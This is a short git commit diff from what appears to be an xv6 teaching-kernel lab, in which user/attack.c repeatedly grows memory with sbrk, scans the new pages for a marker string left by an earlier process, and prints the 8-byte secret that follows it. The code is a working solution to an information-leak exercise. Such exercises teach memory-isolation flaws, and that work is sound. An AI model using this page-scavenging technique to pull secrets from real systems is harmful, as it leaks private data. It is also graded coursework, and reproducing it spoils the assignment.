5f7d8b96d239b32dadfcb18f13398d0e95f3f280
youssef-mansor <youssef-mansour@aucegypt.edu>
2026-06-28 00:45:03 +0300

    attack xv6: prope the pages used by a previous process

--- user/attack.c
+++ user/attack.c
@@ -3,11 +3,28 @@
 #include "user/user.h"
 #include "kernel/riscv.h"
 
+static char marker[] = "my very very very secret pw is: ";
+
 int
 main(int argc, char *argv[])
 {
-  // your code here.  you should write the secret to fd 2 using write
-  // (e.g., write(2, secret, 8)
+  for(int tries = 0; tries < 1024; tries++) {
+    char *p = sbrk(PGSIZE);
+    if(p == (char *)-1)
+      exit(1);
+
+    int ok = 1;
+    for(int j = 8; j < 32; j++) {
+      if(p[j] != marker[j]) {
+        ok = 0;
+        break;
+      }
+    }
+    if(ok) {
+      write(2, p + 32, 8);
+      exit(0);
+    }
+  }
 
   exit(1);
 }
